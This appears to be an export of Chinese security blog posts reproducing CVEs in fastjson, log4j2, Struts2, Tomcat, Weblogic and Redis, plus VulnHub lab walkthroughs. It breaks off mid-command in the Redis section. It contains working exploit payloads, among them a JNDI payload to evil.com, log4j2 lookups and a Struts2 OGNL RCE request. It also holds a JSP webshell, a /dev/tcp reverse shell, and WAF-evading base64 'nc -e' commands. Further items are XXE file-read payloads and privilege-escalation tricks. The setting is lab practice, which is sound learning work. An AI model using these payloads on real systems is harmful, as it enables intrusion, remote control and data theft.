[{"title":"fastjson1.2.24反序列化漏洞复现","url":"/2022/06/13/fastjson1-2-24反序列化漏洞复现/","content":"# 漏洞概述\nCVE-2017-18349\nfastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。\n根据官方给出的补丁文件，主要的更新在这个 checkAutoType 函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。\n\n# 复现环境\nvulhub项目 https://vulhub.org/#/environments/fastjson/1.2.24-rce/\n\n\n# Exploit\n访问\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131547498.png)\n\n\n向服务器post一个json对象,即可更新服务端信息\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131555028.png)\n\n\n\n因为目标环境是 Java 8u102，没有 com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用 com.sun.rowset.JdbcRowSetImpl的利用链，借助 JNDI 注入来执行命令。\n首先编译并上传命令执行代码，如 http://x.x.x.x:8989/TouchFile.class：\n```java\n// javac TouchFile.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class TouchFile {\n    static {\n        try {\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = {\"bash\",\"-c\",\"touch\", \"/tmp/success\"};\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n        } catch (Exception e) {\n            // do nothing\n        }\n    }\n}\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131559623.png)\n\n需要注意的是:\nString commands 在部分环境下需要添加 bash -c ,否则无法执行命令。\n如果没有 web 服务，其实可以通过 php -S 0.0.0.0: port或者 python -m SimpleHTTPServer port临时搭建一个 web 服务器，其发布目录即当前执行目录。\n\n## 有外网VPS\n借助[marshalsec项目](https://github.com/mbechler/marshalsec)启动一个 RMI 服务器，监听 9999 端口，并制定加载远程类 TouchFile.class\n也可以使用打包好的jar包[项目地址](https://github.com/zhzyker/exphub/blob/master/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar)\n\n将生成的 marshalsec-0.0.3-SNAPSHOT-all.jar包部署到公网的一台 VPS 上，执行如下脚本\n```bash\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://x.x.x.x:port/#TouchFile\" 9999\n```\n\n发送如下数据包\n```\nPOST / HTTP/1.1\nHost: your-ip:8090\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/json\nContent-Length: 160\n\n{\n    \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://evil.com:9999/TouchFile\",\n        \"autoCommit\":true\n    }\n}\n```\n\n## 无外网VPS\n使用kali当vps主机\n\n先构造恶意代码,并编译\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131846179.png)\n\n再使用python起一个http服务\n```bash\npython -m http.server 80  \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131847211.png)\n\n接着启动一个RMI服务器，设置监听端口，并制定加载远程类TouchFile.class,ip为http服务的ip\n```bash\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://172.16.17.140:80/#TouchFile\" 9999\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131848263.png)\n\n构造数据包,写入exp\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131849458.png)\n\n命令执行成功\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131850067.png)\n\n反弹shell,只需要修改TouchFile.java文件中的command 部分即可,并重新编译,参考如下:\n```java\n// javac shell_re.java\n import java.lang.Runtime;\n import java.lang.Process;\n public class shell_re {\n    static {\n        try {\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = {\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/x.x.x.x/4444;cat <&5 | while read line; do $line 2>&5 >&5; done\"};\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n        } catch (Exception e) {\n            // do nothing\n        }\n    }\n }\n```\n\nnc 监听\n![](https://raw.githubusercontent.com/chencicici/images/main/202206131857057.png)\n\n\n","tags":["命令执行","fastjson"],"categories":["漏洞复现"]},{"title":"log4j2漏洞复现","url":"/2022/06/12/log4j2漏洞复现/","content":"\n# 概述\nCVE-2021-44228\nApache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。\n在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap://evil.com/example}的lookup用于进行JNDI注入，执行任意代码。\n# 影响范围\nApache Log4j 2.x < 2.15.0-rc2\n\n# 环境\n用的是github上的一个docker环境:log4j_vuln\n```bash\n1.1 拉取漏洞环境镜像\ndocker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln\n1.2 运行漏洞环境容器\ndocker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln\n1.3 进入容器中\ndocker exec -it log4j_vuln_container /bin/bash\n1.4 启动漏洞环境\n/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh\n打开http://xxx.xxx.xxx.xxx:8080/webstudy/hello-fengxuan\n出现以下页面，说明搭建成功。\n```\n# Exploit\n\n## 访问\n访问url\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122023707.png)\n\n## 获取临时域名\n访问 http://dnslog.cn/\n![](https://raw.githubusercontent.com/chencicici/images/main/202206121717449.png)\n\n## dnslog执行代码\n构造payload\n```\nc=${jndi:ldap://log4j2.xxxxxx.dnslog.cn}\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122026561.png)\n\n查看dns平台已经执行成功\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122026083.png)\n\n## 命令执行\n在本地先要生成JNDI链接并启动后端相关服务，注意防火墙开启相关端口，用的是[JNDIExploit-1.2-SNAPSHOT.jar](https://download.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip)\n```bash\njava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.20.146.195 -l 9999 -p 80\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122035772.png)\n\n构造payload\n```\ncmd: whoami\n\nc=${jndi:ldap://10.20.146.195:9999/TomcatBypass/TomcatEcho}\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206122055177.png)\n\n# 修复方案\n补丁链接:\n[log4j-2.15.0-rc2](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2)\n\n1. 添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；\n\n2. 在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；\n\n3. JDK使用11.0.1、8u191、7u201、6u211及以上的高版本。","tags":["命令执行","log4j2"],"categories":["漏洞复现"]},{"title":"Struts2 S2-061漏洞复现","url":"/2022/06/11/Struts2S2-061漏洞复现/","content":"# 概述\nApache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)\nStruts2 会对某些标签属性(比如 `id`，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 `%{x}` 且 `x` 的值用户可控时，用户再传入一个 `%{payload}` 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。\n\n影响范围:Apache Struts 2.0.0-2.5.25\n\n# 环境\nvulhub项目地址 https://vulhub.org/#/environments/struts2/s2-061/\n\n# Exploit\n\n## poc检测\n使用poc检测漏洞是否存在,需要使用url编码\n```\n?id=%25%7b+%27test%27+%2b+(11+%2b+11).toString()%7d\n```\n\n审查元素看到回显\n![](https://raw.githubusercontent.com/chencicici/images/main/202206121321542.png)\n\n## exp利用\n发送下面数据包\n```\nPOST /index.action HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Length: 831\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Disposition: form-data; name=\"id\"\n\n%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"whoami\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206121340388.png)\n\n","tags":["Struts2","命令执行"],"categories":["漏洞复现"]},{"title":"Tomcat弱口令后台getshll复现","url":"/2022/06/10/Tomcat弱口令后台getshll/","content":"# 环境\nvulhub https://vulhub.org/#/environments/tomcat/tomcat8/\n\n# Exploit\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206101540258.png)\n\n弱密码登录后\n\n将shell.jsp打包成shell.zip，在改后缀为shell.war上传\n\n密码passwd\n```jsp\n<%!\n    class U extends ClassLoader {\n        U(ClassLoader c) {\n            super(c);\n        }\n        public Class g(byte[] b) {\n            return super.defineClass(b, 0, b.length);\n        }\n    }\n \n    public byte[] base64Decode(String str) throws Exception {\n        try {\n            Class clazz = Class.forName(\"sun.misc.BASE64Decoder\");\n            return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str);\n        } catch (Exception e) {\n            Class clazz = Class.forName(\"java.util.Base64\");\n            Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);\n            return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str);\n        }\n    }\n%>\n<%\n    String cls = request.getParameter(\"passwd\");\n    if (cls != null) {\n        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);\n    }\n%>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206101552494.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206101558421.png)\n\n连接url\nhttp://localhost:8080/shell/shell.jsp\n![](https://raw.githubusercontent.com/chencicici/images/main/202206101555698.png)\n\n\n","tags":["Tomcat","弱口令"],"categories":["漏洞复现"]},{"title":"红队渗透项目vulnhub-MinUv1打靶","url":"/2022/06/09/红队渗透项目vulnhub-MinUv1打靶/","content":"\n# 环境\n靶机项目地址https://www.vulnhub.com/entry/minu-1,235/\n使用vm导入靶机需要关掉网卡2,再重新dhclinent\n\n靶机:172.16.17.144\n\n攻击机kali:172.16.17.140\n\n\n# 目标\n拿到root下的flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091226745.png)\n\n\n# 信息收集\n\n## nmap收集\n```bash\nnmap -A -sV -sS -T5 172.16.17.144\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091107061.png)\n\n中间件为Apache2.4.27,服务器为ubuntu\n\n## 目录爆破\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091108873.png)\n打开发现只有一个apache首页,丢到dirb爆破\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091110331.png)\n几乎都是403,应该是有限制,要么是脚本要么是waf,继续加大力度爆破\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091133000.png)\n\n发现一个test.php\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091137577.png)\n\n\n# Exploit\n\n## 命令执行\n发现关键字,一般file=xx可能会存在命令执行,文件包含,文件下载,文件读取等漏洞\n尝试读取文件403,应该是存在waf\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091224040.png)\n\n- 尝试命令执行,成功回显\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091226943.png)\nls,cat等命令被拦截\n  \n  \n## waf绕过\n手工fuzz发现使用?或者*可以绕过waf,同样会被解析\n```bash\n原payload  /bin/cat /ect/passwd\n绕过 /b?n/c?t /e?t/pa??wd\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091257717.png)\n\n## 尝试写马失败\n```bash\n原payload\n/bin/echo echo  '<?php @eval($_POST[\"shell\"]);?>'>>shell.php|/usr/bin/base64 -d|/bin/bash\n\nbase64编码过后\n|/b?n/e?ho ZWNobyAgJzw/cGhwIEBldmFsKCRfUE9TVFsic2hlbGwiXSk7Pz4nPj5zaGVsbC5waHA=|/u?r/b?n/b?se64 -d|/b?n/b?sh\n```\n\n在本地kali测试成功,但是在靶机上失败,不知道原因可能被waf拦截了\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091354331.png)\n\n写马不行那就试试nc反弹\n\n## 反弹shell\n本地监听5555端口\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091418598.png)\n\n```bash\n原payload\n/bin/echo \"nc -e /bin/sh 172.16.17.140 5555\" | /usr/bin/base64 -d| /bin/sh \n\nbase64编码过后\n/b?n/e??o bmMgLWUgL2Jpbi9zaCAxNzIuMTYuMTcuMTQwIDU1NTUg|/?s?/b??/b??e64 -d|/b?n/sh \n```\n需要注意的是,base64编码过后会出现=或者==,会被waf拦截,可以末尾添加空格\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091418922.png)\n\n用python反弹一个交互式shell\n```bash\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")' \n```\n这里要注意的是,要根据靶机python变量来,可能是python可能是python3\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091421850.png)\n找到线索\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091424098.png)\n\n## JWT\n一开始以为是编码或者加密,没解出来,仔细看发现,是以`.`分割的三段字符串,标准的JWT\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg\n```\nJWT在线解析 https://jwt.io/#debugger-io\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091431918.png)\n\n前面两部分是base64编码,最后一部分需要秘钥\n\n- 使用工具爆破\n项目地址 https://github.com/brendan-rius/c-jwt-cracker\n```bash\ncd c-jwt-cracker-master \n                                                                                                                                                                                                  \napt-get install libssl-dev\n\nmake\n\n./jwtcrack key\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091452825.png)\n\n等待几分钟爆出密码,根据最开始的提示应该是root密码\n\n## getflag\n登录root\n![](https://raw.githubusercontent.com/chencicici/images/main/202206091456953.png)","tags":["vulnhub","红队"],"categories":["打靶"]},{"title":"vulnhub-dc2打靶","url":"/2022/06/07/vulnhub-dc2打靶/","content":"# 环境\nvulnhub环境,项目地址https://www.vulnhub.com/entry/dc-2,311/\n靶机:172.16.17.143\n攻击机kali:172.16.17.140\n\n\n# 目标\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071953622.png)\n\n# 信息收集\n找到靶机ip\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071939781.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072051340.png)\n\n打开跳转dc-2/,502\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071940839.png)\n\n抓包发现301永久跳转一个页面\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071952711.png)\n\n添加一个解析\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072000538.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072000379.png)\n拿到第一个flag,提示我们使用cewl来生成密码\n\n# 爆破\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072012702.png)\ncewl使用 https://www.freebuf.com/articles/network/190128.html\n\n使用cewl生成字典\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072018340.png)\n\n需要扫出登录点\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072035043.png)\n经典wordpress\n\n掏出wpscan,枚举用户\n```bash\nwpscan --url  http://dc-2 -e u\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072041502.png)\n\n将用户名写入txt,开始爆破\n```bash\nwpscan --url  http://dc-2 -U name.txt -P pwd.txt\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072044253.png)\n\n登录jerry账号发现flag2\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072047333.png)\nflag提示,如果wp没法利用就找别的方法,想到刚刚信息收集还有ssh,用这两个账号去试试\n\nmsf爆破ssh\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072057740.png)\n最后使用tom用户成功登录\n\n\n# 提权\n尝试之后发现权限很低,使用vi查看内容\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072100660.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072059691.png)\n得到提示,尝试su,发现没有这个命令,查看一下当前用户的环境变量\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072103628.png)\n\n使用vi尝试绕过,得到一个正常环境变量\n```bash\nvi a.txt\n\n#设置shell变量\n:shell = /bin/bash\n\n#启动shell\n:shell\n\n# 导入环境变量\nexport PATH=$PATH:/bin\n\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072116628.png)\n\n登录jerry,使用刚刚爆破出的密码,得到flag4.txt,没有提示\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072120697.png)\n\n查看历史命令,发现有使用sudo git,也就是说git是有root权限的\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072129726.png)\n\ngit提权\n```bash\nsudo git help add\n末尾输入!/bin/bash\n\n或者\n\nsudo git help config\n末尾输入\n!'sh'\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072127120.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206072128530.png)\n\n","tags":["vulnhub"],"categories":["打靶"]},{"title":"vulbhub-dc1打靶","url":"/2022/06/07/vulbhub-dc1打靶/","content":"# 环境\nvulnhub靶场,项目地址:https://www.vulnhub.com/entry/dc-1,292/\n靶机:172.16.17.142\n攻击机:172.16.17.140\n网络模式:net\n\n\n# 目标\n找到5个flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071210943.png)\n\n\n# 信息收集\n- nmap扫描找目标ip\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071206991.png)\n  \n- 访问web\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071208399.png)\n  收集到web指纹,和cms指纹\n  \n# exp利用\ngoogle找到cms有nday(cve-2018-7600),进kali找exp打\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202206071212266.png)\n  返弹一个meterpreter shell,但是权限很低\n\n\n# 找flag\n- 第一个flag\n用python反弹一个交互式shell\n\n```python\npython -c 'import pty;pty.spawn(\"/bin/sh\")'\npython ‐c \"import pty;pty.spawn('/bin/bash')\"\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071217200.png)\n\n拿到提示信息 (每个好的 CMS 都需要一个配置文件——你也一样。)\n百度找配置文件路径,写一个一句话上去用蚁剑连,方便一点\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071240945.png)\n\n在此配置文件下找到mysql连接账号密码\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071242424.png)\n\n要注意的是,这里的mysql不出网,只能通过msf反弹的shell去连接\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071252501.png)\n\n拿到网站后台账号密码,但是解密不出\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071303091.png)\n\n继续往下翻数据库\n\n- flag3的线索\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071257889.png)\n\n到此，我们看到了flag3到底在哪里了(uid为1的用户是不受Drupal权限管制的，具有最高权限。)现在我们有两个思路：\n1. 重置管理员密码\n可能是环境原因,我在加密密码的时候报错\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071311553.png)\n   网上找了一个加密好的\n   ```\n    明文：password\n    密文：$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4\n    ```\n   写入表中替换原来的密码\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202206071315494.png)\n   ```mysql\n   update drupaldb.users set pass=\"$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4\" where uid=1;  \n   ```\n   登录\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202206071317471.png)\n   找到flag3得到提示\n   ![](https://raw.githubusercontent.com/chencicici/images/main/202206071319974.png)\n   (特殊的PERMS将帮助您找到passwd，但您需要执行该命令来确定如何获取阴影中的内容。)\n    \n\n2. 利用exp添加用户\n   \n    首先要查看cms具体版本\n   ![](https://raw.githubusercontent.com/chencicici/images/main/202206071327767.png)\n   \n    使用searchsploit找exp\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202206071328915.png)\n    \n    需要使用python2去运行,之后会创建一个test的用户\n    ![](https://raw.githubusercontent.com/chencicici/images/main/202206071335890.png)\n   ![](https://raw.githubusercontent.com/chencicici/images/main/202206071336865.png)\n   \n\n# 提权\n根据flag3的提示,去寻找线索\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071341447.png)\n发现flag4 在home目录下\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071342274.png)\n拿到flag4的提示\n(是否可以使用相同的方法在root目录下找到最终flag)\n\n根据提示,想到使用suid提权,查询root权限的命令\n```bash\nfind / -user root -perm -4000\nfind / -user root -perm -4000 -print 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\nfind / -user root -perm -4000 -exec ls -ldb {} ;\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071349039.png)\n\n可以看到find本身就是root权限\n\n使用find提权,要注意的是-name后的文件必须存在\n```bash\nfind ./ -name flag4.txt -exec '/bin/sh' \\;\n\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071355907.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206071357520.png)\n","tags":["drupal7","vulnhub","提权"],"categories":["打靶"]},{"title":"Weblogic WLS CoreComponents反序列化漏洞复现","url":"/2022/06/04/WeblogicWLSCoreComponents反序列化漏洞复现/","content":"# 漏洞解析\nWeblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）\nOracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。\n\n# 环境\nvulhub环境\n```bash\ncd CVE-2018-2628  \ndocker-compose up -d\n```\n\n# Exploit\n使用工具检测\n![](https://raw.githubusercontent.com/chencicici/images/main/202206041231208.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206041231652.png)\n\n","tags":["反序列化","Weblogic"],"categories":["漏洞复现"]},{"title":"vulnhub-XXE Lab:1","url":"/2022/06/03/vulnhub-XXELab-1/","content":"# 环境\n项目地址:https://www.vulnhub.com/entry/xxe-lab-1,254/\n攻击机 kali:172.16.17.140\n靶机:172.16.17.141\n\n# 信息收集\nnmap扫一下,只开了80端口应该是这个\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032004003.png)\n\n详细扫描\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032008378.png)\n\nrobots.txt存在两个禁止爬取的目录\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032009689.png)\n\nadmin.php无法访问\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032010229.png)\n\nXXE目录直接跳转到一个登录页面\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032011673.png)\n\n扫描一下目录\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032016456.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032017129.png)\n\n扫出来的目录都在xxe下面\n\n# fuzz\n对功能点进行测试 /xxe\nxxe,登录点抓包\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032020685.png)\n使用xml传递数据,结合靶场名字,此处应该存在xml实体注入\n\n## 构造payload\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032024438.png)\n存在xml注入漏洞,但是通过需要找到flag\n```xml\n<?xml version=\"1.0\" ?> <!DOCTYPE r \n        [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM \"file:///etc/passwd\"> \n                ]> \n<root><name>&sp;</name><password>hj</password></root>\n```\n\n- 构造伪协议读取/admin.php\nbase64编码防止php代码被执行\n```xml\n<?xml version=\"1.0\" ?> <!DOCTYPE r [ \n        <!ELEMENT r ANY > <!ENTITY sp SYSTEM \"php://filter/read=convert.base64-encode/resource=admin.php\"> \n        ]> \n<root><name>&sp;</name><password>hj</password></root>\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032030915.png)\n\n## 登录\n- base64解码\n读取到账号密码\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202206032031373.png)\n  \n- 登录\n密码是md5加密,解密出来\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202206032034930.png)\n  \n发现无法登录\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032037275.png)\n\n继续查看admin.php源码发现还有一个路径,flag this here\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032038786.png)\n\n访问,存在文件但是无任何回显\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032039056.png)\n\n## 绕来绕去的解码\n用上面的payload读取源码\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032042053.png)\n\n解码出来,flag在这里,明显又是编码过的\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032043496.png)\n\n密文32位,猜测是base32\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032045190.png)\n\n又是编码过的,看到=直接丢base64,一个小技巧,base64末尾有=,base32没有\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032047754.png)\n\n这个文件应该是flag了,用上面的payload读取\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032049966.png)\n\n再解码\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032050649.png)\n\n看到`$`,猜测为php代码混淆过后的,拿去运行\n最后在运行报错中找到flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206032055796.png)\n\n\n  \n","tags":["vulnhub","XXE"],"categories":["打靶"]},{"title":"redis未授权访问利用","url":"/2022/06/02/redis未授权访问利用/","content":"# 漏洞解析\nRedis未授权访问在4.x/5.0.5以前版本下，我们可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。\n\n# 利用前提\nredis直接暴露在外网,无访问限制\n没有设置密码认证（一般为空），可以免密码远程登录redis服务。\n\n# 靶场环境\n使用vulhub环境\n\n```bash\ncd redis/4-unacc \ndocker-compose up -d\n```\n\n# 漏洞利用\n\n## 下载连接客户端\n```bash\nwget http://download.redis.io/redis-stable.tar.gz\ntar -zxvf redis-stable.tar.gz\ncd redis-stable \nmake \ncp src/redis-cli /usr/bin/\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021617001.png)\n\n\n\n## redis命令\n```bash\n使用密码连接reids\nredis-cli -h ip -p port -a password\n\n无密码连接redis\nredis-cli -h ip\n\n测试连通性\nping\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021622678.png)\n\n\n## 写webshell\n利用条件\n- 知道真实路径\n- 读写权限\n\n\n因为靶场没有web服务,写入tmp目录下\n```redis\n10.20.146.195:6379> config set dir /tmp #设置绝对路径\nOK\n10.20.146.195:6379> config set dbfilename shell.php #写入文件名\nOK\n10.20.146.195:6379> set shell \"\\r\\n\\r\\n<?php phpinfo()?>\\r\\n\" #写入数据\nOK\n10.20.146.195:6379> save #保存\nOK\n```\nCONFIG 命令查看或设置配置项\ndbfilename 备份文件\n\n\\n\\r\\n为换行符,在写入的时候redis会自动写入其他数据,避免代码无法正常执行\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021643250.png)\n\n## 写入公钥\n靶机上没有ssh,先安装,再生成公私秘钥\n```bash\napt-get update\napt-get install openssh-client\napt-get install openssh-server\nserver ssh start\nssh-keygen -t rsa\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021656260.png)\n\n在攻击机上也生成公私秘钥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021657083.png)\n\n写入到key.txt\n```bash\n(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > key.txt\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206021708197.png)\n\n在redis中修改备份目录\n![](https://raw.githubusercontent.com/chencicici/images/main/202206022022347.png)\n报错 (error) ERR Changing directory: No such file or directory\n因为此处,是vulhub环境,没有以root权限去启动,所以没有权限,演示不了\n\n然后执行\n![](https://raw.githubusercontent.com/chencicici/images/main/202206022024528.png)\n```bash\nconfig set dbfilename \"authorized_keys\"\nsave\n```\n\n写入之后直接使用攻击机ssh redis服务器就可以免密登录\n\n\n## 计划任务反弹shell\n利用条件\n- 需要以root用户\n\n采用crontab每分钟连接攻击机一次\n```bash\nconfig set dir /var/spool/cron/crontabs\nconfig set dbfilename root\nset xxx \"\\n\\n\\n*/1 * * * 